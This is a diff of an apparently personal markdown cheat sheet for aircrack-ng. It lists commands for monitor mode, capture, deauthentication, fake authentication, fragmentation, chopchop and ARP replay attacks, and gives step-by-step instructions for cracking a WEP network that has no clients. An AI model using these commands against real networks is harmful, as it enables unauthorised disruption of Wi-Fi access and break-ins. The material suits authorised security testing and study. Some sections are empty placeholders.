@@ -12,24 +12,6 @@ Verify that [injection tests](https://www.aircrack-ng.org/doku.php?id=injection_
 $ aireplay-ng -9 -e dd-wrt wlan0mon
 ```
 
-## airmon-ng
-Checking and kill networking services.
-```
-$ airmon-ng check kill
-```
-
-Set interface to monitor mode.
-```bash
-$ airmon-ng start wlan1
-```
-
-Stop monitor mode and restart networking.
-```
-$ airmon-ng stop wlan1
-$ systemctl restart network-manager.service
-```
-
-## airodump-ng
 Find surrounding networks, access points and clients
 ```bash
 $ airodump-ng wlan1
@@ -41,7 +23,18 @@ Begin collection on target channel, BSSID and recording to file.
   - `--bssid` MAC address of access point
   - `--ivs` Save only captured IVs
 ```bash
-$ airodump-ng -c 6 --bssid E0:05:C5:60:2E:65 --ivs -w capture  wlan1
+$ airodump-ng -c 6 --bssid E0:05:C5:60:2E:65 --ivs -w capture wlan1
+```
+
+## WEP without clients
+Steps to perform an attack on a WEP access point with no associated clients.
+  1) Monitor and capture the target network traffic using `airodump-ng`.
+  2) In a new console execute Fake Authentication attack method.
+  3) In a new console execute Fragmentation attack method and wait.
+  4) If #3 is not working, run chopchop attack.
+
+```bash
+$ aireplay-ng -5 -b ap_mac -h our_mac wlan0mon
 ```
 
 ## aircrack-ng
@@ -55,24 +48,58 @@ Invoke PTW WEP cracking method method on an arp replay.
 $ aircrack-ng -z replay_arp-0309-015802.cap
 ```
 
-## aireplay-ng
-Set attack mode [Fake authentication](https://www.aircrack-ng.org/doku.php?id=fake_authentication).
-  - `-1` Set `-1` count
-  - `-o` Number of packets to send at a time
-  - `-q` Number of seconds to send keep-alive packets
-  - `-e` Filename to write
-  - `-a` Target access point MAC address
+## airmon-ng
+Set interface to monitor mode.
 ```bash
-$ aireplay-ng -1 180 -o 1 -q 10 -e capture -a A0:21:B7:60:2E:65 wlan1
+$ airmon-ng start wlx9cefd5fd1181
 ```
 
-Set attack mode [deauthentication](https://www.aircrack-ng.org/doku.php?id=deauthentication).
-  - `--deauth` Set `deauth` count
+Stop monitor mode and restart networking.
+```
+$ airmon-ng stop wlan0mon
+$ systemctl restart network-manager.service
+```
+
+Checking and kill networking services.
+```
+$ airmon-ng check kill
+```
+
+## aireplay-ng
+### Deauthentication
+Set attack mode [Deauthentication](https://www.aircrack-ng.org/doku.php?id=deauthentication).
+  - `-0` Set for `deauthentication` mode
   - `-e` Target access point ESSID
   - `-a` Target access point MAC address
   - `-c` Set destination MAC address
 ```bash
-$ aireplay-ng --deauth 5 -e access_point -a A0:21:B7:60:2E:65 -c AC:65:21:B7:2E:60 wlan1
+$ aireplay-ng -0 5 -e access_point -a A0:21:B7:60:2E:65 -c AC:65:21:B7:2E:60 wlan1
+```
+
+### Fake Authentication
+Set attack mode [Fake authentication](https://www.aircrack-ng.org/doku.php?id=fake_authentication).
+  - `-1` Set for fake authentication attack
+  - `180` Reassociation timing in seconds
+  - `-o` Number of packets to send at a time
+  - `-q` Frequency to send keep-alive packets
+  - `-e` Target access point network name
+  - `-a` Target access point MAC address
+  - `-h` Our wireless card's MAC address
+```bash
+$ aireplay-ng -1 180 -o 1 -q 10 -e ap_name -a ap_mac -h our_mac wlan0mon
+```
+
+## -2
+
+## -3
+
+## KoreK chopchop attack
+Set attack mode [Korek chopchop](https://www.aircrack-ng.org/doku.php?id=korek_chopchop).
+  - `-4` Set for chopchop attack
+  - `-b` Target access point MAC address
+  - `-h` Our wireless card's MAC address
+```bash
+$  aireplay-ng -4 -b ap_mac -h our_mac wlan0mon
 ```
 
 Set attack mode [ARP request replay attack](https://www.aircrack-ng.org/doku.php?id=arp-request_reinjection).
